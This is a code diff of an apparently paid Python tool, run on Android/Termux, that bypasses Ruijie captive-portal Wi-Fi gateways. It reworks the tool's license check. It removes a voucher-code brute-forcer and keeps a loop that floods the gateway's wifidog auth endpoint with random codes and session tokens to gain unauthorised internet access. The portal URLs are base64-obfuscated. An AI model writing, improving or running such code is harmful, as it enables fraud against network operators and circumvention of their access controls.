@@ -27,29 +27,27 @@ from concurrent.futures import ThreadPoolExecutor
 
 # --- CONFIGURATION (Moe Yu's Database) ---
 KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/main/key.txt"
-ID_STORAGE = ".moe_yu_id" # ID ကို အသေသိမ်းမည့်ဖိုင်
 
 # Colors
 w, g, y, r, b, c = "\033[1;37m", "\033[1;32m", "\033[1;33m", "\033[1;31m", "\033[1;34m", "\033[1;36m"
+
+def get_hwid():
+    """Android System ID ကို တိုက်ရိုက်ဆွဲထုတ်ခြင်း (Fixed ID အတွက် အသေချာဆုံးနည်းလမ်း)"""
+    try:
+        # Android ID ကို settings command နဲ့ ဆွဲထုတ်ခြင်း
+        raw_id = subprocess.check_output('settings get secure android_id', shell=True).decode().strip()
+        if not raw_id or raw_id == "null":
+            # မရခဲ့ရင် Termux Path ကို အခြေခံပြီး ID ထုတ်ခြင်း
+            raw_id = os.environ.get('PREFIX', '/data/data/com.termux/files/usr')
+        return hashlib.md5(raw_id.encode()).hexdigest().upper()
+    except:
+        return "MOEYU-STABLE-LICENSE-SYSTEM-FIXED"
 
 def clear():
     os.system("clear")
 
 def Line():
     print(f"{y}─" * os.get_terminal_size()[0])
-
-def get_hwid():
-    """ID ကို ဖိုင်ထဲတွင် အသေသိမ်းဆည်းသောစနစ် (ဘယ်တော့မှ မပြောင်းပါ)"""
-    if os.path.exists(ID_STORAGE):
-        with open(ID_STORAGE, "r") as f:
-            return f.read().strip()
-    else:
-        # ပထမဆုံးအကြိမ်တွင်သာ Hardware အခြေခံ၍ ID အသစ်ထုတ်ပြီး သိမ်းမည်
-        node = str(uuid.getnode())
-        new_id = hashlib.md5(node.encode()).hexdigest().upper()
-        with open(ID_STORAGE, "w") as f:
-            f.write(new_id)
-        return new_id
 
 def Logo():
     clear()
@@ -74,10 +72,9 @@ def Logo():
     Line()
 
 def check_key():
-    """Permanent License Check via GitHub"""
     my_id = get_hwid()
     Logo()
-    print(f"{y}[*] Initializing Secure License System...{w}")
+    print(f"{y}[*] Verifying Secure License...{w}")
     try:
         res = requests.get(KEY_URL, timeout=15)
         if res.status_code == 200:
@@ -89,21 +86,17 @@ def check_key():
                         today = datetime.now().date()
                         expiry = datetime.strptime(exp_str.strip(), "%Y-%m-%d").date()
                         if today <= expiry:
-                            days_left = (expiry - today).days
-                            print(f"{g}[+] License Valid! ({days_left} days left){w}")
+                            print(f"{g}[+] License Authorized!{w}")
                             time.sleep(1.5)
                             return True
                         else:
-                            print(f"{r}[!] YOUR LICENSE HAS EXPIRED!{w}")
-                            print(f"{y}[>] Expired on: {exp_str}")
+                            print(f"{r}[!] KEY EXPIRED!{w}")
                             sys.exit()
-            
-            print(f"{r}[!] UNREGISTERED DEVICE ID!{w}")
-            print(f"{y}[>] Your ID: {c}{my_id}{w}")
-            print(f"{y}[>] Send this ID to @moeyu for activation.")
+            print(f"{r}[!] UNREGISTERED ID!{w}")
+            print(f"{y}[>] Your Fixed ID: {c}{my_id}{w}")
             sys.exit()
     except:
-        print(f"{r}[!] Connection Failed! Check your internet.")
+        print(f"{r}[!] Connection Failed!{w}")
         sys.exit()
 
 async def get_session_id(session, session_url, prev_id):
@@ -117,74 +110,38 @@ class InternetAccess:
     def __init__(self):
         self.session_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ==').decode()
         try: self.ip = open(".ip", "r").read().strip()
-        except: print(f"{r}[!] Run -o setup first!"); sys.exit()
+        except: print(f"{r}[!] Run setup first!"); sys.exit()
 
     async def execute(self):
         Logo()
-        print(f"{y}[*] Bypassing Ruijie Gateways...{w}")
         async with aiohttp.ClientSession() as session:
-            loop_count = 0
+            l = 0
             while True:
-                if loop_count % 5 == 0: sid = await get_session_id(session, self.session_url, None)
+                if l % 5 == 0: sid = await get_session_id(session, self.session_url, None)
                 code = "".join(random.choice(string.digits) for _ in range(6))
                 try:
                     async with session.post(f'http://{self.ip}:2060/wifidog/auth?', params={'token': sid, 'phoneNumber': code}) as res:
-                        p = await asyncio.to_thread(ping3.ping, 'google.com')
-                        p_fmt = f"{g}{int(p*1000)}ms" if p else f"{r}Lost"
-                        print(f"{w}[{datetime.now().strftime('%H:%M:%S')}] Bypass Active {w}| Status: {res.status} | Ping: {p_fmt}")
+                        print(f"{w}[{datetime.now().strftime('%H:%M:%S')}] Bypass Active | Status: {g}{res.status}")
                 except: pass
                 await asyncio.sleep(1)
-                loop_count += 1
-
-class VoucherCode:
-    def __init__(self, mode, length, speed):
-        self.mode, self.length, self.speed = mode, length, speed
-        try: self.session_url = open(".session_url", "r").read().strip()
-        except: print(f"{r}[!] Run -o setup first!"); sys.exit()
-
-    async def start(self):
-        Logo()
-        print(f"{g}[+] Bruteforce Starting... Mode: {self.mode}{w}")
-        Line()
-        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=self.speed)) as session:
-            loop_idx = 0
-            while True:
-                if loop_idx % 90 == 0: sid = await get_session_id(session, self.session_url, None)
-                v = "".join(random.choice(string.digits if self.mode == "digit" else string.ascii_letters) for _ in range(self.length))
-                url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
-                try:
-                    async with session.post(url, json={"accessCode": v, "sessionId": sid, "apiVersion": 1}) as req:
-                        if 'logonUrl' in await req.text():
-                            print(f"{g}[+] FOUND VALID VOUCHER: {v}{w}")
-                            with open("success.txt", "a") as f: f.write(f"{v}\n")
-                except: pass
-                loop_idx += 1
+                l += 1
 
 def feature():
-    parser = argparse.ArgumentParser(description="Moe Yu Ruijie Bypass PRO")
-    parser.add_argument("-o", "--option", choices=["code", "internet", "setup"], required=True)
-    parser.add_argument("-m", "--mode", choices=["digit", "ascii"], default="digit")
-    parser.add_argument("-l", "--length", type=int, default=6)
-    parser.add_argument("-s", "--speed", type=int, default=100)
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-o", "--option", choices=["internet", "setup"], required=True)
     args = parser.parse_args()
-
     if args.option == "setup":
         Logo()
         try:
             res = requests.get("http://192.168.0.1", timeout=5).url
             gw = re.search('gw_address=(.*?)&', res).group(1)
-            portal = requests.get(res).text
-            sid_url = "https://portal-as.ruijienetworks.com" + re.search("href='(.*?)'</script>", portal).group(1)
-            with open(".session_url", "w") as f: f.write(sid_url)
             with open(".ip", "w") as f: f.write(gw)
-            print(f"{g}[+] Setup Completed! ID is now Locked.{w}")
-        except: print(f"{r}[!] Connection Failed. Connect to Router WiFi.")
+            print(f"{g}[+] Setup Success! ID is now Fixed.{w}")
+        except: print(f"{r}[!] Setup Failed.")
     elif args.option == "internet":
         asyncio.run(InternetAccess().execute())
-    elif args.option == "code":
-        asyncio.run(VoucherCode(args.mode, args.length, args.speed).start())
 
 if __name__ == "__main__":
     if check_key():
         try: feature()
-        except KeyboardInterrupt: print(f"\n{r}[!] Stopped by user.{w}")
+        except KeyboardInterrupt: print(f"\n{r}[!] Stopped.{w}")
